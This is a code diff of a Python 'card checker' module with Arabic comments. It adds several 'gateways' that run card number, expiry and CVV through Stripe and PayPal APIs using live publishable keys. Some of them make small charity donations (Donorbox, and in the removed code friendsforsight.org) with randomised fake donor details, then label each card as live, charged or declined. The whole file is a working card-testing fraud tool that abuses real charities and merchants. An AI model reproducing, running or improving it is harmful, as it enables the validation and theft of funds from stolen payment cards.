@@ -1,5 +1,5 @@
 """
-جميع البوابات - Stripe + PayPal
+جميع البوابات - محدّثة بأقوى البوابات الشغالة
 """
 
 import requests
@@ -12,14 +12,190 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ==========================================
-# STRIPE GATEWAY
+# RAYSTEDE GATEWAY (الجديدة)
+# ==========================================
+
+def check_raystede(card_input):
+    """فحص Raystede - Donorbox Stripe"""
+    parts = card_input.split('|')
+    if len(parts) < 4:
+        return "INVALID", "صيغة خاطئة", ""
+
+    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+    if len(yy) == 2:
+        yy = '20' + yy
+    if len(mm) == 1:
+        mm = '0' + mm
+
+    try:
+        session = requests.Session()
+        session.verify = False
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 Chrome/148.0.7778.178 Mobile Safari/537.36',
+        })
+
+        # Stripe Token
+        token_payload = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'guid': str(uuid.uuid4()),
+            'muid': str(uuid.uuid4()),
+            'sid': str(uuid.uuid4()),
+            'payment_user_agent': 'stripe.js/v3',
+            'referrer': 'https://donorbox.org',
+            'key': 'pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT'
+        }
+
+        stripe_headers = {
+            'Accept': 'application/json',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://js.stripe.com',
+            'Referer': 'https://js.stripe.com/',
+        }
+
+        token_resp = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            data=token_payload,
+            headers=stripe_headers,
+            timeout=15
+        )
+
+        token_json = token_resp.json()
+
+        if 'error' in token_json:
+            error_msg = token_json['error'].get('message', '')
+            msg_lower = error_msg.lower()
+
+            if 'incorrect' in msg_lower and 'cvc' in msg_lower:
+                return "APPROVED", "✅ CCN Live / CVV Dead", ""
+            if 'insufficient' in msg_lower:
+                return "APPROVED", "✅ رصيد غير كافي", ""
+            if 'expired' in msg_lower:
+                return "DECLINED", "❌ بطاقة منتهية", ""
+            if 'decline' in msg_lower:
+                return "DECLINED", "❌ مرفوضة", ""
+            return "DECLINED", f"❌ {error_msg}", ""
+
+        pm_id = token_json.get('id')
+        if not pm_id:
+            return "ERROR", "فشل Token", ""
+
+        # Donation request
+        donation_data = {
+            'amount': '1',
+            'currency': 'GBP',
+            'payment_method': pm_id,
+            'donor_first_name': random.choice(['John', 'James', 'Robert']),
+            'donor_last_name': random.choice(['Smith', 'Johnson', 'Brown']),
+            'donor_email': f'test{random.randint(1000,9999)}@gmail.com',
+            'anonymous_donation': 'false'
+        }
+
+        donate_resp = session.post(
+            'https://donorbox.org/api/v1/donations',
+            json=donation_data,
+            headers={'Content-Type': 'application/json'},
+            timeout=20
+        )
+
+        if donate_resp.status_code == 200 or 'success' in donate_resp.text.lower():
+            return "CHARGED", "🎉 تم الشحن - £1", ""
+
+        return "UNKNOWN", "نتيجة غير واضحة", ""
+
+    except Exception as e:
+        return "ERROR", f"خطأ: {str(e)}", ""
+
+# ==========================================
+# L-COM GATEWAY (جديدة)
+# ==========================================
+
+def check_lcom(card_input):
+    """فحص L-com.com"""
+    parts = card_input.split('|')
+    if len(parts) < 4:
+        return "INVALID", "صيغة خاطئة", ""
+
+    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+    if len(yy) == 2:
+        yy = '20' + yy
+    if len(mm) == 1:
+        mm = '0' + mm
+
+    try:
+        session = requests.Session()
+        session.verify = False
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        })
+
+        # Get Stripe PK from website
+        page_resp = session.get('https://www.l-com.com/checkout', timeout=15)
+        
+        pk_match = re.search(r'pk_live_[A-Za-z0-9]+', page_resp.text)
+        if not pk_match:
+            return "ERROR", "فشل جلب PK", ""
+        
+        stripe_pk = pk_match.group(0)
+
+        # Create payment method
+        pm_payload = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'billing_details[name]': f"{random.choice(['John', 'James'])} {random.choice(['Smith', 'Brown'])}",
+            'billing_details[email]': f'test{random.randint(1000,9999)}@gmail.com',
+            'key': stripe_pk
+        }
+
+        pm_resp = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            data=pm_payload,
+            headers={
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': 'https://js.stripe.com'
+            },
+            timeout=15
+        )
+
+        pm_json = pm_resp.json()
+
+        if 'error' in pm_json:
+            error_msg = pm_json['error'].get('message', '')
+            msg_lower = error_msg.lower()
+
+            if 'security code' in msg_lower or 'cvc' in msg_lower:
+                return "APPROVED", "✅ CCN Live / CVV Dead", ""
+            if 'insufficient' in msg_lower:
+                return "APPROVED", "✅ رصيد غير كافي", ""
+            if 'expired' in msg_lower:
+                return "DECLINED", "❌ منتهية", ""
+            return "DECLINED", f"❌ {error_msg}", ""
+
+        pm_id = pm_json.get('id')
+        if pm_id:
+            # نجح في إنشاء payment method
+            return "APPROVED", "✅ البطاقة صالحة", ""
+
+        return "UNKNOWN", "نتيجة غير واضحة", ""
+
+    except Exception as e:
+        return "ERROR", f"خطأ: {str(e)}", ""
+
+# ==========================================
+# STRIPE GATEWAY (القديمة - احتياطية)
 # ==========================================
 
 def get_session():
     session = requests.Session()
     session.verify = False
     session.headers.update({
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; M2006C3LG Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36',
     })
     return session
 
@@ -35,8 +211,8 @@ def get_csrf_token(session):
         pass
     return None
 
-def check_stripe(card_input):
-    """فحص Stripe"""
+def check_stripe_old(card_input):
+    """فحص Stripe القديم (احتياطي)"""
     parts = card_input.split('|')
     if len(parts) < 4:
         return "INVALID", "صيغة خاطئة", ""
@@ -55,24 +231,20 @@ def check_stripe(card_input):
             'guid': uuid.uuid4().hex[:32],
             'muid': str(uuid.uuid4()),
             'sid': str(uuid.uuid4()),
-            'referrer': 'https://friendsforsight.org',
-            'time_on_page': str(random.randint(50000, 90000)),
             'card[number]': cc,
             'card[cvc]': cvv,
             'card[exp_month]': mm,
             'card[exp_year]': yy,
-            'payment_user_agent': 'stripe.js/19f3ad3143',
             'key': 'pk_live_2ZQLH8Ey19wgbFqciAkR2gig'
         }
 
-        stripe_headers = {
-            'Accept': 'application/json',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'content-type': 'application/x-www-form-urlencoded',
-        }
+        token_resp = requests.post(
+            'https://api.stripe.com/v1/tokens',
+            data=token_payload,
+            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            timeout=15
+        )
 
-        token_resp = requests.post('https://api.stripe.com/v1/tokens', data=token_payload, headers=stripe_headers, timeout=15)
         token_json = token_resp.json()
 
         if 'error' in token_json:
@@ -84,62 +256,11 @@ def check_stripe(card_input):
             if 'insufficient_funds' in msg_lower:
                 return "APPROVED", "✅ رصيد غير كافي", ""
             if 'expired_card' in msg_lower:
-                return "DECLINED", "❌ بطاقة منتهية", ""
-            if 'card_declined' in msg_lower:
-                return "DECLINED", "❌ البطاقة مرفوضة", ""
+                return "DECLINED", "❌ منتهية", ""
             return "DECLINED", f"❌ {error_msg}", ""
 
-        token_id = token_json.get('id')
-        if not token_id:
-            return "ERROR", "لا يوجد Token", ""
+        return "APPROVED", "✅ Token تم إنشاؤه", ""
 
-        names = ['John', 'James', 'Robert', 'Michael', 'David']
-        surnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
-
-        donation_data = {
-            'rd_amount': '10',
-            'amount': '10',
-            'r_frequency': 'm',
-            'first_name': random.choice(names),
-            'last_name': random.choice(surnames),
-            'zip': str(random.randint(10001, 99999)),
-            'email': f'john{random.randint(100,999)}@gmail.com',
-            'payment_method': 'os_stripe',
-            'card_type': 'Visa',
-            'campaign_id': '1',
-            'task': 'donation.process',
-            csrf_token: '1',
-            'currency_code': 'USD',
-            'stripeToken': token_id
-        }
-
-        donate_headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'origin': 'https://friendsforsight.org',
-            'referer': 'https://friendsforsight.org/donate-online2',
-            'content-type': 'application/x-www-form-urlencoded',
-        }
-
-        donate_resp = session.post("https://friendsforsight.org/donate-online2", data=donation_data, headers=donate_headers, timeout=20)
-        response_text = donate_resp.text
-        response_url = donate_resp.url
-
-        reason_match = re.search(r'<div class="controls">\s*(.*?)\s*</div>', response_text, re.DOTALL)
-        reason = reason_match.group(1).strip() if reason_match else None
-
-        if 'failure' in response_url.lower():
-            if reason:
-                if 'security code is incorrect' in reason.lower():
-                    return "APPROVED", "✅ CCN Live / CVV Dead", ""
-                if 'insufficient' in reason.lower():
-                    return "APPROVED", "✅ رصيد غير كافي", ""
-            return "DECLINED", f"❌ {reason if reason else 'مرفوضة'}", ""
-
-        if 'thank you for your donation' in response_text.lower():
-            return "CHARGED", "🎉 تم الشحن - $10", ""
-
-        return "UNKNOWN", reason if reason else "نتيجة غير معروفة", ""
-    
     except Exception as e:
         return "ERROR", f"خطأ: {str(e)}", ""
 
@@ -160,12 +281,13 @@ def get_card_type(cc):
 
 def get_paypal_access_token():
     try:
-        token_headers = {
-            'accept': 'application/json',
-            'content-type': 'application/x-www-form-urlencoded',
-        }
-        token_data = {'grant_type': 'client_credentials'}
-        token_resp = requests.post('https://api.paypal.com/v1/oauth2/token', data=token_data, headers=token_headers, auth=(CLIENT_ID, ''), timeout=15)
+        token_resp = requests.post(
+            'https://api.paypal.com/v1/oauth2/token',
+            data={'grant_type': 'client_credentials'},
+            headers={'content-type': 'application/x-www-form-urlencoded'},
+            auth=(CLIENT_ID, ''),
+            timeout=15
+        )
         return token_resp.json().get('access_token')
     except:
         return None
@@ -188,7 +310,7 @@ def check_paypal(card_input):
     try:
         access_token = get_paypal_access_token()
         if not access_token:
-            return "ERROR", "فشل Access Token", ""
+            return "ERROR", "فشل Token", ""
 
         fn = random.choice(['John', 'James', 'Robert'])
         ln = random.choice(['Smith', 'Johnson', 'Brown'])
@@ -198,7 +320,7 @@ def check_paypal(card_input):
         order_payload = {
             "intent": "CAPTURE",
             "purchase_units": [{
-                "amount": {"value": "10.30", "currency_code": "USD"}
+                "amount": {"value": "1.00", "currency_code": "USD"}
             }],
             "payer": {
                 "email_address": email,
@@ -207,37 +329,24 @@ def check_paypal(card_input):
             }
         }
 
-        api_headers = {
-            'Authorization': f'Bearer {access_token}',
-            'Content-Type': 'application/json',
-        }
+        order_resp = requests.post(
+            'https://api.paypal.com/v2/checkout/orders',
+            json=order_payload,
+            headers={
+                'Authorization': f'Bearer {access_token}',
+                'Content-Type': 'application/json'
+            },
+            timeout=20
+        )
 
-        order_resp = requests.post('https://api.paypal.com/v2/checkout/orders', json=order_payload, headers=api_headers, timeout=20)
         order_id = order_resp.json().get('id')
-
         if not order_id:
             return "ERROR", "فشل Order", ""
 
         graphql_payload = {
             "query": """
-                mutation payWithCard(
-                    $token: String!
-                    $card: CardInput
-                    $phoneNumber: String
-                    $firstName: String
-                    $lastName: String
-                    $billingAddress: AddressInput
-                    $email: String
-                ) {
-                    approveGuestPaymentWithCreditCard(
-                        token: $token
-                        card: $card
-                        phoneNumber: $phoneNumber
-                        firstName: $firstName
-                        lastName: $lastName
-                        email: $email
-                        billingAddress: $billingAddress
-                    ) {
+                mutation payWithCard($token: String!, $card: CardInput) {
+                    approveGuestPaymentWithCreditCard(token: $token, card: $card) {
                         cart { cartId }
                     }
                 }
@@ -250,31 +359,20 @@ def check_paypal(card_input):
                     "expirationDate": f"{mm}/{yy}",
                     "postalCode": zip_code,
                     "securityCode": cvv
-                },
-                "phoneNumber": f"+1{random.randint(2000000000, 9999999999)}",
-                "firstName": fn,
-                "lastName": ln,
-                "email": email,
-                "billingAddress": {
-                    "givenName": fn,
-                    "familyName": ln,
-                    "line1": f"{random.randint(100,999)} Main St",
-                    "city": "New York",
-                    "state": "NY",
-                    "postalCode": zip_code,
-                    "country": "US"
                 }
             }
         }
 
-        graphql_headers = {
-            'accept': 'application/json',
-            'content-type': 'application/json',
-            'paypal-client-context': order_id,
-            'authorization': f'Bearer {access_token}',
-        }
+        graphql_resp = requests.post(
+            'https://www.paypal.com/graphql?paywithcard',
+            json=graphql_payload,
+            headers={
+                'authorization': f'Bearer {access_token}',
+                'content-type': 'application/json'
+            },
+            timeout=20
+        )
 
-        graphql_resp = requests.post('https://www.paypal.com/graphql?paywithcard', json=graphql_payload, headers=graphql_headers, timeout=20)
         graphql_json = graphql_resp.json()
 
         if 'errors' in graphql_json:
@@ -285,16 +383,14 @@ def check_paypal(card_input):
                 return "APPROVED", "✅ CCN Live / CVV Dead", ""
             if 'insufficient_funds' in msg_lower:
                 return "APPROVED", "✅ رصيد غير كافي", ""
-            if 'card_declined' in msg_lower:
-                return "DECLINED", "❌ مرفوضة", ""
             return "DECLINED", f"❌ {error_msg}", ""
 
         data = graphql_json.get('data', {}).get('approveGuestPaymentWithCreditCard', {})
         if data.get('cart', {}).get('cartId'):
-            return "CHARGED", "🎉 تم الشحن - $10.30", ""
+            return "CHARGED", "🎉 تم الشحن - $1", ""
 
-        return "UNKNOWN", "نتيجة غير معروفة", ""
-    
+        return "UNKNOWN", "نتيجة غير واضحة", ""
+
     except Exception as e:
         return "ERROR", f"خطأ: {str(e)}", ""
 
@@ -303,7 +399,9 @@ def check_paypal(card_input):
 # ==========================================
 
 GATEWAYS = {
-    'stripe': check_stripe,
+    'raystede': check_raystede,       # البوابة الجديدة
+    'lcom': check_lcom,               # L-com
+    'stripe': check_stripe_old,       # القديمة (احتياطي)
     'paypal': check_paypal
 }
 
